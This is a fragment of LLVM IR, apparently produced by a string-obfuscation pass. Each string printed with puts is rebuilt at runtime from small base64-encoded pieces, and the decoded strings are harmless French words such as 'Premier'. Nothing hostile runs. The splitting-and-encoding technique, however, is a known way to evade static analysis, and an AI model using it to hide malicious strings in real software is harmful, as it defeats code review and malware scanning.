  %sp7.113 = bitcast i8* %next6.113 to [2 x i8]*
  store [2 x i8] %s7.113, [2 x i8]* %sp7.113
  %cast97= getelementptr [10 x i8], [10 x i8]* %spi113, i64 0, i64 0
;-------------------------------
  call i32 @puts(i8* %cast97)
  br label %next97
BB_99:
;-------------------------------
; Replace: %cast99= getelementptr [10 x i8], [10 x i8]* @.str98, i64 0, i64 0
  %spi114 = alloca [10 x i8]
  
;-------------------------------
; Replace: %s0.114 = load [1 x i8], [1 x i8]* @str.0.114
  %cipher.ptr.247 = alloca [5 x i8]
  store [5 x i8] c"\64\41\3d\3d\00", [5 x i8]* %cipher.ptr.247
  %cipher.247 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.247, i32 0, i32 0
  %plain.ptr.247 = tail call i8* @base64_decode(i8* %cipher.247)
  %spi247 = bitcast i8* %plain.ptr.247 to [1 x i8]*
  %s0.114 = load [1 x i8], [1 x i8]* %spi247
;-------------------------------
  %sp0.114 = bitcast [10 x i8]* %spi114 to [1 x i8]*
  store [1 x i8] %s0.114, [1 x i8]* %sp0.114
  %next0.114 = getelementptr [10 x i8], [10 x i8]* %spi114, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.114 = load [1 x i8], [1 x i8]* @str.1.114
  %cipher.ptr.245 = alloca [5 x i8]
  store [5 x i8] c"\63\67\3d\3d\00", [5 x i8]* %cipher.ptr.245
  %cipher.245 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.245, i32 0, i32 0
  %plain.ptr.245 = tail call i8* @base64_decode(i8* %cipher.245)
  %spi245 = bitcast i8* %plain.ptr.245 to [1 x i8]*
  %s1.114 = load [1 x i8], [1 x i8]* %spi245
;-------------------------------
  %sp1.114 = bitcast i8* %next0.114 to [1 x i8]*
  store [1 x i8] %s1.114, [1 x i8]* %sp1.114
  %next1.114 = getelementptr [10 x i8], [10 x i8]* %spi114, i32 0, i32 2
  
;-------------------------------
; Replace: %s2.114 = load [1 x i8], [1 x i8]* @str.2.114
  %cipher.ptr.249 = alloca [5 x i8]
  store [5 x i8] c"\62\77\3d\3d\00", [5 x i8]* %cipher.ptr.249
  %cipher.249 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.249, i32 0, i32 0
  %plain.ptr.249 = tail call i8* @base64_decode(i8* %cipher.249)
  %spi249 = bitcast i8* %plain.ptr.249 to [1 x i8]*
  %s2.114 = load [1 x i8], [1 x i8]* %spi249
;-------------------------------
  %sp2.114 = bitcast i8* %next1.114 to [1 x i8]*
  store [1 x i8] %s2.114, [1 x i8]* %sp2.114
  %next2.114 = getelementptr [10 x i8], [10 x i8]* %spi114, i32 0, i32 3
  
;-------------------------------
; Replace: %s3.114 = load [2 x i8], [2 x i8]* @str.3.114
  %cipher.ptr.251 = alloca [5 x i8]
  store [5 x i8] c"\61\58\4d\3d\00", [5 x i8]* %cipher.ptr.251
  %cipher.251 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.251, i32 0, i32 0
  %plain.ptr.251 = tail call i8* @base64_decode(i8* %cipher.251)
  %spi251 = bitcast i8* %plain.ptr.251 to [2 x i8]*
  %s3.114 = load [2 x i8], [2 x i8]* %spi251
;-------------------------------
  %sp3.114 = bitcast i8* %next2.114 to [2 x i8]*
  store [2 x i8] %s3.114, [2 x i8]* %sp3.114
  %next3.114 = getelementptr [10 x i8], [10 x i8]* %spi114, i32 0, i32 5
  
;-------------------------------
; Replace: %s4.114 = load [1 x i8], [1 x i8]* @str.4.114
  %cipher.ptr.246 = alloca [5 x i8]
  store [5 x i8] c"\61\51\3d\3d\00", [5 x i8]* %cipher.ptr.246
  %cipher.246 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.246, i32 0, i32 0
  %plain.ptr.246 = tail call i8* @base64_decode(i8* %cipher.246)
  %spi246 = bitcast i8* %plain.ptr.246 to [1 x i8]*
  %s4.114 = load [1 x i8], [1 x i8]* %spi246
;-------------------------------
  %sp4.114 = bitcast i8* %next3.114 to [1 x i8]*
  store [1 x i8] %s4.114, [1 x i8]* %sp4.114
  %next4.114 = getelementptr [10 x i8], [10 x i8]* %spi114, i32 0, i32 6
  
;-------------------------------
; Replace: %s5.114 = load [1 x i8], [1 x i8]* @str.5.114
  %cipher.ptr.250 = alloca [5 x i8]
  store [5 x i8] c"\5a\51\3d\3d\00", [5 x i8]* %cipher.ptr.250
  %cipher.250 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.250, i32 0, i32 0
  %plain.ptr.250 = tail call i8* @base64_decode(i8* %cipher.250)
  %spi250 = bitcast i8* %plain.ptr.250 to [1 x i8]*
  %s5.114 = load [1 x i8], [1 x i8]* %spi250
;-------------------------------
  %sp5.114 = bitcast i8* %next4.114 to [1 x i8]*
  store [1 x i8] %s5.114, [1 x i8]* %sp5.114
  %next5.114 = getelementptr [10 x i8], [10 x i8]* %spi114, i32 0, i32 7
  
;-------------------------------
; Replace: %s6.114 = load [1 x i8], [1 x i8]* @str.6.114
  %cipher.ptr.248 = alloca [5 x i8]
  store [5 x i8] c"\62\51\3d\3d\00", [5 x i8]* %cipher.ptr.248
  %cipher.248 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.248, i32 0, i32 0
  %plain.ptr.248 = tail call i8* @base64_decode(i8* %cipher.248)
  %spi248 = bitcast i8* %plain.ptr.248 to [1 x i8]*
  %s6.114 = load [1 x i8], [1 x i8]* %spi248
;-------------------------------
  %sp6.114 = bitcast i8* %next5.114 to [1 x i8]*
  store [1 x i8] %s6.114, [1 x i8]* %sp6.114
  %next6.114 = getelementptr [10 x i8], [10 x i8]* %spi114, i32 0, i32 8
  
;-------------------------------
; Replace: %s7.114 = load [2 x i8], [2 x i8]* @str.7.114
  %cipher.ptr.252 = alloca [5 x i8]
  store [5 x i8] c"\5a\51\41\3d\00", [5 x i8]* %cipher.ptr.252
  %cipher.252 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.252, i32 0, i32 0
  %plain.ptr.252 = tail call i8* @base64_decode(i8* %cipher.252)
  %spi252 = bitcast i8* %plain.ptr.252 to [2 x i8]*
  %s7.114 = load [2 x i8], [2 x i8]* %spi252
;-------------------------------
  %sp7.114 = bitcast i8* %next6.114 to [2 x i8]*
  store [2 x i8] %s7.114, [2 x i8]* %sp7.114
  %cast99= getelementptr [10 x i8], [10 x i8]* %spi114, i64 0, i64 0
;-------------------------------
  call i32 @puts(i8* %cast99)
  br label %next99
BB_101:
;-------------------------------
; Replace: %cast101= getelementptr [8 x i8], [8 x i8]* @.str100, i64 0, i64 0
  %spi115 = alloca [8 x i8]
  
;-------------------------------
; Replace: %s0.115 = load [1 x i8], [1 x i8]* @str.0.115
  %cipher.ptr.256 = alloca [5 x i8]
  store [5 x i8] c"\55\41\3d\3d\00", [5 x i8]* %cipher.ptr.256
  %cipher.256 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.256, i32 0, i32 0
  %plain.ptr.256 = tail call i8* @base64_decode(i8* %cipher.256)
  %spi256 = bitcast i8* %plain.ptr.256 to [1 x i8]*
  %s0.115 = load [1 x i8], [1 x i8]* %spi256
;-------------------------------
  %sp0.115 = bitcast [8 x i8]* %spi115 to [1 x i8]*
  store [1 x i8] %s0.115, [1 x i8]* %sp0.115
  %next0.115 = getelementptr [8 x i8], [8 x i8]* %spi115, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.115 = load [1 x i8], [1 x i8]* @str.1.115
  %cipher.ptr.253 = alloca [5 x i8]
  store [5 x i8] c"\63\67\3d\3d\00", [5 x i8]* %cipher.ptr.253
  %cipher.253 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.253, i32 0, i32 0
  %plain.ptr.253 = tail call i8* @base64_decode(i8* %cipher.253)
  %spi253 = bitcast i8* %plain.ptr.253 to [1 x i8]*
  %s1.115 = load [1 x i8], [1 x i8]* %spi253
;-------------------------------
  %sp1.115 = bitcast i8* %next0.115 to [1 x i8]*
  store [1 x i8] %s1.115, [1 x i8]* %sp1.115
  %next1.115 = getelementptr [8 x i8], [8 x i8]* %spi115, i32 0, i32 2
  
;-------------------------------
; Replace: %s2.115 = load [1 x i8], [1 x i8]* @str.2.115
  %cipher.ptr.255 = alloca [5 x i8]
  store [5 x i8] c"\5a\51\3d\3d\00", [5 x i8]* %cipher.ptr.255
  %cipher.255 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.255, i32 0, i32 0
  %plain.ptr.255 = tail call i8* @base64_decode(i8* %cipher.255)
  %spi255 = bitcast i8* %plain.ptr.255 to [1 x i8]*
  %s2.115 = load [1 x i8], [1 x i8]* %spi255
;-------------------------------
  %sp2.115 = bitcast i8* %next1.115 to [1 x i8]*
  store [1 x i8] %s2.115, [1 x i8]* %sp2.115
  %next2.115 = getelementptr [8 x i8], [8 x i8]* %spi115, i32 0, i32 3
  
;-------------------------------
; Replace: %s3.115 = load [1 x i8], [1 x i8]* @str.3.115
  %cipher.ptr.258 = alloca [5 x i8]
  store [5 x i8] c"\62\51\3d\3d\00", [5 x i8]* %cipher.ptr.258
  %cipher.258 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.258, i32 0, i32 0
  %plain.ptr.258 = tail call i8* @base64_decode(i8* %cipher.258)
  %spi258 = bitcast i8* %plain.ptr.258 to [1 x i8]*
  %s3.115 = load [1 x i8], [1 x i8]* %spi258
;-------------------------------
  %sp3.115 = bitcast i8* %next2.115 to [1 x i8]*
  store [1 x i8] %s3.115, [1 x i8]* %sp3.115
  %next3.115 = getelementptr [8 x i8], [8 x i8]* %spi115, i32 0, i32 4
  
;-------------------------------
; Replace: %s4.115 = load [1 x i8], [1 x i8]* @str.4.115
  %cipher.ptr.254 = alloca [5 x i8]
  store [5 x i8] c"\61\51\3d\3d\00", [5 x i8]* %cipher.ptr.254
  %cipher.254 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.254, i32 0, i32 0
  %plain.ptr.254 = tail call i8* @base64_decode(i8* %cipher.254)
  %spi254 = bitcast i8* %plain.ptr.254 to [1 x i8]*
  %s4.115 = load [1 x i8], [1 x i8]* %spi254
;-------------------------------
  %sp4.115 = bitcast i8* %next3.115 to [1 x i8]*
  store [1 x i8] %s4.115, [1 x i8]* %sp4.115
  %next4.115 = getelementptr [8 x i8], [8 x i8]* %spi115, i32 0, i32 5
  
;-------------------------------
; Replace: %s5.115 = load [1 x i8], [1 x i8]* @str.5.115
  %cipher.ptr.257 = alloca [5 x i8]
  store [5 x i8] c"\5a\51\3d\3d\00", [5 x i8]* %cipher.ptr.257
  %cipher.257 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.257, i32 0, i32 0
  %plain.ptr.257 = tail call i8* @base64_decode(i8* %cipher.257)
  %spi257 = bitcast i8* %plain.ptr.257 to [1 x i8]*
  %s5.115 = load [1 x i8], [1 x i8]* %spi257
;-------------------------------
  %sp5.115 = bitcast i8* %next4.115 to [1 x i8]*
  store [1 x i8] %s5.115, [1 x i8]* %sp5.115
  %next5.115 = getelementptr [8 x i8], [8 x i8]* %spi115, i32 0, i32 6
  
;-------------------------------
; Replace: %s6.115 = load [1 x i8], [1 x i8]* @str.6.115
  %cipher.ptr.259 = alloca [5 x i8]
  store [5 x i8] c"\63\67\3d\3d\00", [5 x i8]* %cipher.ptr.259
  %cipher.259 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.259, i32 0, i32 0
  %plain.ptr.259 = tail call i8* @base64_decode(i8* %cipher.259)
  %spi259 = bitcast i8* %plain.ptr.259 to [1 x i8]*
  %s6.115 = load [1 x i8], [1 x i8]* %spi259
;-------------------------------
  %sp6.115 = bitcast i8* %next5.115 to [1 x i8]*
  store [1 x i8] %s6.115, [1 x i8]* %sp6.115
  %next6.115 = getelementptr [8 x i8], [8 x i8]* %spi115, i32 0, i32 7
  
  %s7.115 = load [1 x i8], [1 x i8]* @str.7.115
  %sp7.115 = bitcast i8* %next6.115 to [1 x i8]*
  store [1 x i8] %s7.115, [1 x i8]* %sp7.115
  %cast101= getelementptr [8 x i8], [8 x i8]* %spi115, i64 0, i64 0
;-------------------------------
  call i32 @puts(i8* %cast101)
  br label %next101
BB_103:
;-------------------------------
; Replace: %cast103= getelementptr [11 x i8], [11 x i8]* @.str102, i64 0, i64 0
  %spi116 = alloca [11 x i8]
  
;-------------------------------
; Replace: %s0.116 = load [1 x i8], [1 x i8]* @str.0.116
  %cipher.ptr.263 = alloca [5 x i8]
  store [5 x i8] c"\62\77\3d\3d\00", [5 x i8]* %cipher.ptr.263
  %cipher.263 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.263, i32 0, i32 0
  %plain.ptr.263 = tail call i8* @base64_decode(i8* %cipher.263)
  %spi263 = bitcast i8* %plain.ptr.263 to [1 x i8]*
  %s0.116 = load [1 x i8], [1 x i8]* %spi263
;-------------------------------
  %sp0.116 = bitcast [11 x i8]* %spi116 to [1 x i8]*
  store [1 x i8] %s0.116, [1 x i8]* %sp0.116
  %next0.116 = getelementptr [11 x i8], [11 x i8]* %spi116, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.116 = load [1 x i8], [1 x i8]* @str.1.116
  %cipher.ptr.260 = alloca [5 x i8]
  store [5 x i8] c"\61\77\3d\3d\00", [5 x i8]* %cipher.ptr.260
  %cipher.260 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.260, i32 0, i32 0
  %plain.ptr.260 = tail call i8* @base64_decode(i8* %cipher.260)
  %spi260 = bitcast i8* %plain.ptr.260 to [1 x i8]*
  %s1.116 = load [1 x i8], [1 x i8]* %spi260
;-------------------------------
  %sp1.116 = bitcast i8* %next0.116 to [1 x i8]*
  store [1 x i8] %s1.116, [1 x i8]* %sp1.116
  %next1.116 = getelementptr [11 x i8], [11 x i8]* %spi116, i32 0, i32 2
  
;-------------------------------
; Replace: %s2.116 = load [2 x i8], [2 x i8]* @str.2.116
  %cipher.ptr.264 = alloca [5 x i8]
  store [5 x i8] c"\61\57\38\3d\00", [5 x i8]* %cipher.ptr.264
  %cipher.264 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.264, i32 0, i32 0
  %plain.ptr.264 = tail call i8* @base64_decode(i8* %cipher.264)
  %spi264 = bitcast i8* %plain.ptr.264 to [2 x i8]*
  %s2.116 = load [2 x i8], [2 x i8]* %spi264
;-------------------------------
  %sp2.116 = bitcast i8* %next1.116 to [2 x i8]*
  store [2 x i8] %s2.116, [2 x i8]* %sp2.116
  %next2.116 = getelementptr [11 x i8], [11 x i8]* %spi116, i32 0, i32 4
  
;-------------------------------
; Replace: %s3.116 = load [1 x i8], [1 x i8]* @str.3.116
  %cipher.ptr.265 = alloca [5 x i8]
  store [5 x i8] c"\61\67\3d\3d\00", [5 x i8]* %cipher.ptr.265
  %cipher.265 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.265, i32 0, i32 0
  %plain.ptr.265 = tail call i8* @base64_decode(i8* %cipher.265)
  %spi265 = bitcast i8* %plain.ptr.265 to [1 x i8]*
  %s3.116 = load [1 x i8], [1 x i8]* %spi265
;-------------------------------
  %sp3.116 = bitcast i8* %next2.116 to [1 x i8]*
  store [1 x i8] %s3.116, [1 x i8]* %sp3.116
  %next3.116 = getelementptr [11 x i8], [11 x i8]* %spi116, i32 0, i32 5
  
;-------------------------------
; Replace: %s4.116 = load [1 x i8], [1 x i8]* @str.4.116
  %cipher.ptr.262 = alloca [5 x i8]
  store [5 x i8] c"\64\67\3d\3d\00", [5 x i8]* %cipher.ptr.262
  %cipher.262 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.262, i32 0, i32 0
  %plain.ptr.262 = tail call i8* @base64_decode(i8* %cipher.262)
  %spi262 = bitcast i8* %plain.ptr.262 to [1 x i8]*
  %s4.116 = load [1 x i8], [1 x i8]* %spi262
;-------------------------------
  %sp4.116 = bitcast i8* %next3.116 to [1 x i8]*
  store [1 x i8] %s4.116, [1 x i8]* %sp4.116
  %next4.116 = getelementptr [11 x i8], [11 x i8]* %spi116, i32 0, i32 6
  
;-------------------------------
; Replace: %s5.116 = load [2 x i8], [2 x i8]* @str.5.116
  %cipher.ptr.266 = alloca [5 x i8]
  store [5 x i8] c"\61\53\77\3d\00", [5 x i8]* %cipher.ptr.266
  %cipher.266 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.266, i32 0, i32 0
  %plain.ptr.266 = tail call i8* @base64_decode(i8* %cipher.266)
  %spi266 = bitcast i8* %plain.ptr.266 to [2 x i8]*
  %s5.116 = load [2 x i8], [2 x i8]* %spi266
;-------------------------------
  %sp5.116 = bitcast i8* %next4.116 to [2 x i8]*
  store [2 x i8] %s5.116, [2 x i8]* %sp5.116
  %next5.116 = getelementptr [11 x i8], [11 x i8]* %spi116, i32 0, i32 8
  
;-------------------------------
; Replace: %s6.116 = load [1 x i8], [1 x i8]* @str.6.116
  %cipher.ptr.261 = alloca [5 x i8]
  store [5 x i8] c"\5a\51\3d\3d\00", [5 x i8]* %cipher.ptr.261
  %cipher.261 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.261, i32 0, i32 0
  %plain.ptr.261 = tail call i8* @base64_decode(i8* %cipher.261)
  %spi261 = bitcast i8* %plain.ptr.261 to [1 x i8]*
  %s6.116 = load [1 x i8], [1 x i8]* %spi261
;-------------------------------
  %sp6.116 = bitcast i8* %next5.116 to [1 x i8]*
  store [1 x i8] %s6.116, [1 x i8]* %sp6.116
  %next6.116 = getelementptr [11 x i8], [11 x i8]* %spi116, i32 0, i32 9
  
;-------------------------------
; Replace: %s7.116 = load [2 x i8], [2 x i8]* @str.7.116
  %cipher.ptr.267 = alloca [5 x i8]
  store [5 x i8] c"\63\67\41\3d\00", [5 x i8]* %cipher.ptr.267
  %cipher.267 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.267, i32 0, i32 0
  %plain.ptr.267 = tail call i8* @base64_decode(i8* %cipher.267)
  %spi267 = bitcast i8* %plain.ptr.267 to [2 x i8]*
  %s7.116 = load [2 x i8], [2 x i8]* %spi267
;-------------------------------
  %sp7.116 = bitcast i8* %next6.116 to [2 x i8]*
  store [2 x i8] %s7.116, [2 x i8]* %sp7.116
  %cast103= getelementptr [11 x i8], [11 x i8]* %spi116, i64 0, i64 0
;-------------------------------
  call i32 @puts(i8* %cast103)
  br label %next103
BB_105:
;-------------------------------
; Replace: %cast105= getelementptr [11 x i8], [11 x i8]* @.str104, i64 0, i64 0
  %spi117 = alloca [11 x i8]
  
;-------------------------------
; Replace: %s0.117 = load [1 x i8], [1 x i8]* @str.0.117
  %cipher.ptr.271 = alloca [5 x i8]
  store [5 x i8] c"\62\77\3d\3d\00", [5 x i8]* %cipher.ptr.271
  %cipher.271 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.271, i32 0, i32 0
  %plain.ptr.271 = tail call i8* @base64_decode(i8* %cipher.271)
  %spi271 = bitcast i8* %plain.ptr.271 to [1 x i8]*
  %s0.117 = load [1 x i8], [1 x i8]* %spi271
;-------------------------------
  %sp0.117 = bitcast [11 x i8]* %spi117 to [1 x i8]*
  store [1 x i8] %s0.117, [1 x i8]* %sp0.117
  %next0.117 = getelementptr [11 x i8], [11 x i8]* %spi117, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.117 = load [1 x i8], [1 x i8]* @str.1.117
  %cipher.ptr.274 = alloca [5 x i8]
  store [5 x i8] c"\61\77\3d\3d\00", [5 x i8]* %cipher.ptr.274
  %cipher.274 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.274, i32 0, i32 0
  %plain.ptr.274 = tail call i8* @base64_decode(i8* %cipher.274)
  %spi274 = bitcast i8* %plain.ptr.274 to [1 x i8]*
  %s1.117 = load [1 x i8], [1 x i8]* %spi274
;-------------------------------
  %sp1.117 = bitcast i8* %next0.117 to [1 x i8]*
  store [1 x i8] %s1.117, [1 x i8]* %sp1.117
  %next1.117 = getelementptr [11 x i8], [11 x i8]* %spi117, i32 0, i32 2
  
;-------------------------------
; Replace: %s2.117 = load [2 x i8], [2 x i8]* @str.2.117
  %cipher.ptr.269 = alloca [5 x i8]
  store [5 x i8] c"\61\57\38\3d\00", [5 x i8]* %cipher.ptr.269
  %cipher.269 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.269, i32 0, i32 0
  %plain.ptr.269 = tail call i8* @base64_decode(i8* %cipher.269)
  %spi269 = bitcast i8* %plain.ptr.269 to [2 x i8]*
  %s2.117 = load [2 x i8], [2 x i8]* %spi269
;-------------------------------
  %sp2.117 = bitcast i8* %next1.117 to [2 x i8]*
  store [2 x i8] %s2.117, [2 x i8]* %sp2.117
  %next2.117 = getelementptr [11 x i8], [11 x i8]* %spi117, i32 0, i32 4
  
;-------------------------------
; Replace: %s3.117 = load [1 x i8], [1 x i8]* @str.3.117
  %cipher.ptr.272 = alloca [5 x i8]
  store [5 x i8] c"\61\67\3d\3d\00", [5 x i8]* %cipher.ptr.272
  %cipher.272 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.272, i32 0, i32 0
  %plain.ptr.272 = tail call i8* @base64_decode(i8* %cipher.272)
  %spi272 = bitcast i8* %plain.ptr.272 to [1 x i8]*
  %s3.117 = load [1 x i8], [1 x i8]* %spi272
;-------------------------------
  %sp3.117 = bitcast i8* %next2.117 to [1 x i8]*
  store [1 x i8] %s3.117, [1 x i8]* %sp3.117
  %next3.117 = getelementptr [11 x i8], [11 x i8]* %spi117, i32 0, i32 5
  
;-------------------------------
; Replace: %s4.117 = load [1 x i8], [1 x i8]* @str.4.117
  %cipher.ptr.273 = alloca [5 x i8]
  store [5 x i8] c"\64\67\3d\3d\00", [5 x i8]* %cipher.ptr.273
  %cipher.273 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.273, i32 0, i32 0
  %plain.ptr.273 = tail call i8* @base64_decode(i8* %cipher.273)
  %spi273 = bitcast i8* %plain.ptr.273 to [1 x i8]*
  %s4.117 = load [1 x i8], [1 x i8]* %spi273
;-------------------------------
  %sp4.117 = bitcast i8* %next3.117 to [1 x i8]*
  store [1 x i8] %s4.117, [1 x i8]* %sp4.117
  %next4.117 = getelementptr [11 x i8], [11 x i8]* %spi117, i32 0, i32 6
  
;-------------------------------
; Replace: %s5.117 = load [2 x i8], [2 x i8]* @str.5.117
  %cipher.ptr.268 = alloca [5 x i8]
  store [5 x i8] c"\61\53\77\3d\00", [5 x i8]* %cipher.ptr.268
  %cipher.268 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.268, i32 0, i32 0
  %plain.ptr.268 = tail call i8* @base64_decode(i8* %cipher.268)
  %spi268 = bitcast i8* %plain.ptr.268 to [2 x i8]*
  %s5.117 = load [2 x i8], [2 x i8]* %spi268
;-------------------------------
  %sp5.117 = bitcast i8* %next4.117 to [2 x i8]*
  store [2 x i8] %s5.117, [2 x i8]* %sp5.117
  %next5.117 = getelementptr [11 x i8], [11 x i8]* %spi117, i32 0, i32 8
  
;-------------------------------
; Replace: %s6.117 = load [1 x i8], [1 x i8]* @str.6.117
  %cipher.ptr.270 = alloca [5 x i8]
  store [5 x i8] c"\5a\51\3d\3d\00", [5 x i8]* %cipher.ptr.270
  %cipher.270 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.270, i32 0, i32 0
  %plain.ptr.270 = tail call i8* @base64_decode(i8* %cipher.270)
  %spi270 = bitcast i8* %plain.ptr.270 to [1 x i8]*
  %s6.117 = load [1 x i8], [1 x i8]* %spi270
;-------------------------------
  %sp6.117 = bitcast i8* %next5.117 to [1 x i8]*
  store [1 x i8] %s6.117, [1 x i8]* %sp6.117
  %next6.117 = getelementptr [11 x i8], [11 x i8]* %spi117, i32 0, i32 9
  
;-------------------------------
; Replace: %s7.117 = load [2 x i8], [2 x i8]* @str.7.117
  %cipher.ptr.275 = alloca [5 x i8]
  store [5 x i8] c"\63\67\41\3d\00", [5 x i8]* %cipher.ptr.275
  %cipher.275 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.275, i32 0, i32 0
  %plain.ptr.275 = tail call i8* @base64_decode(i8* %cipher.275)
  %spi275 = bitcast i8* %plain.ptr.275 to [2 x i8]*
  %s7.117 = load [2 x i8], [2 x i8]* %spi275
;-------------------------------
  %sp7.117 = bitcast i8* %next6.117 to [2 x i8]*
  store [2 x i8] %s7.117, [2 x i8]* %sp7.117
  %cast105= getelementptr [11 x i8], [11 x i8]* %spi117, i64 0, i64 0
;-------------------------------
  call i32 @puts(i8* %cast105)
  br label %next105
BB_107:
;-------------------------------
; Replace: %cast107= getelementptr [10 x i8], [10 x i8]* @.str106, i64 0, i64 0
  %spi118 = alloca [10 x i8]
  
;-------------------------------
; Replace: %s0.118 = load [1 x i8], [1 x i8]* @str.0.118
  %cipher.ptr.278 = alloca [5 x i8]
  store [5 x i8] c"\52\41\3d\3d\00", [5 x i8]* %cipher.ptr.278
  %cipher.278 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.278, i32 0, i32 0
  %plain.ptr.278 = tail call i8* @base64_decode(i8* %cipher.278)
  %spi278 = bitcast i8* %plain.ptr.278 to [1 x i8]*
  %s0.118 = load [1 x i8], [1 x i8]* %spi278
;-------------------------------
  %sp0.118 = bitcast [10 x i8]* %spi118 to [1 x i8]*
  store [1 x i8] %s0.118, [1 x i8]* %sp0.118
  %next0.118 = getelementptr [10 x i8], [10 x i8]* %spi118, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.118 = load [1 x i8], [1 x i8]* @str.1.118
  %cipher.ptr.282 = alloca [5 x i8]
  store [5 x i8] c"\5a\51\3d\3d\00", [5 x i8]* %cipher.ptr.282
  %cipher.282 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.282, i32 0, i32 0
  %plain.ptr.282 = tail call i8* @base64_decode(i8* %cipher.282)
  %spi282 = bitcast i8* %plain.ptr.282 to [1 x i8]*
  %s1.118 = load [1 x i8], [1 x i8]* %spi282
;-------------------------------
  %sp1.118 = bitcast i8* %next0.118 to [1 x i8]*
  store [1 x i8] %s1.118, [1 x i8]* %sp1.118
  %next1.118 = getelementptr [10 x i8], [10 x i8]* %spi118, i32 0, i32 2
  
;-------------------------------
; Replace: %s2.118 = load [1 x i8], [1 x i8]* @str.2.118
  %cipher.ptr.283 = alloca [5 x i8]
  store [5 x i8] c"\64\51\3d\3d\00", [5 x i8]* %cipher.ptr.283
  %cipher.283 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.283, i32 0, i32 0
  %plain.ptr.283 = tail call i8* @base64_decode(i8* %cipher.283)
  %spi283 = bitcast i8* %plain.ptr.283 to [1 x i8]*
  %s2.118 = load [1 x i8], [1 x i8]* %spi283
;-------------------------------
  %sp2.118 = bitcast i8* %next1.118 to [1 x i8]*
  store [1 x i8] %s2.118, [1 x i8]* %sp2.118
  %next2.118 = getelementptr [10 x i8], [10 x i8]* %spi118, i32 0, i32 3
  
;-------------------------------
; Replace: %s3.118 = load [2 x i8], [2 x i8]* @str.3.118
  %cipher.ptr.277 = alloca [5 x i8]
  store [5 x i8] c"\65\47\6b\3d\00", [5 x i8]* %cipher.ptr.277
  %cipher.277 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.277, i32 0, i32 0
  %plain.ptr.277 = tail call i8* @base64_decode(i8* %cipher.277)
  %spi277 = bitcast i8* %plain.ptr.277 to [2 x i8]*
  %s3.118 = load [2 x i8], [2 x i8]* %spi277
;-------------------------------
  %sp3.118 = bitcast i8* %next2.118 to [2 x i8]*
  store [2 x i8] %s3.118, [2 x i8]* %sp3.118
  %next3.118 = getelementptr [10 x i8], [10 x i8]* %spi118, i32 0, i32 5
  
;-------------------------------
; Replace: %s4.118 = load [1 x i8], [1 x i8]* @str.4.118
  %cipher.ptr.281 = alloca [5 x i8]
  store [5 x i8] c"\77\77\3d\3d\00", [5 x i8]* %cipher.ptr.281
  %cipher.281 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.281, i32 0, i32 0
  %plain.ptr.281 = tail call i8* @base64_decode(i8* %cipher.281)
  %spi281 = bitcast i8* %plain.ptr.281 to [1 x i8]*
  %s4.118 = load [1 x i8], [1 x i8]* %spi281
;-------------------------------
  %sp4.118 = bitcast i8* %next3.118 to [1 x i8]*
  store [1 x i8] %s4.118, [1 x i8]* %sp4.118
  %next4.118 = getelementptr [10 x i8], [10 x i8]* %spi118, i32 0, i32 6
  
;-------------------------------
; Replace: %s5.118 = load [1 x i8], [1 x i8]* @str.5.118
  %cipher.ptr.276 = alloca [5 x i8]
  store [5 x i8] c"\71\41\3d\3d\00", [5 x i8]* %cipher.ptr.276
  %cipher.276 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.276, i32 0, i32 0
  %plain.ptr.276 = tail call i8* @base64_decode(i8* %cipher.276)
  %spi276 = bitcast i8* %plain.ptr.276 to [1 x i8]*
  %s5.118 = load [1 x i8], [1 x i8]* %spi276
;-------------------------------
  %sp5.118 = bitcast i8* %next4.118 to [1 x i8]*
  store [1 x i8] %s5.118, [1 x i8]* %sp5.118
  %next5.118 = getelementptr [10 x i8], [10 x i8]* %spi118, i32 0, i32 7
  
;-------------------------------
; Replace: %s6.118 = load [1 x i8], [1 x i8]* @str.6.118
  %cipher.ptr.279 = alloca [5 x i8]
  store [5 x i8] c"\62\51\3d\3d\00", [5 x i8]* %cipher.ptr.279
  %cipher.279 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.279, i32 0, i32 0
  %plain.ptr.279 = tail call i8* @base64_decode(i8* %cipher.279)
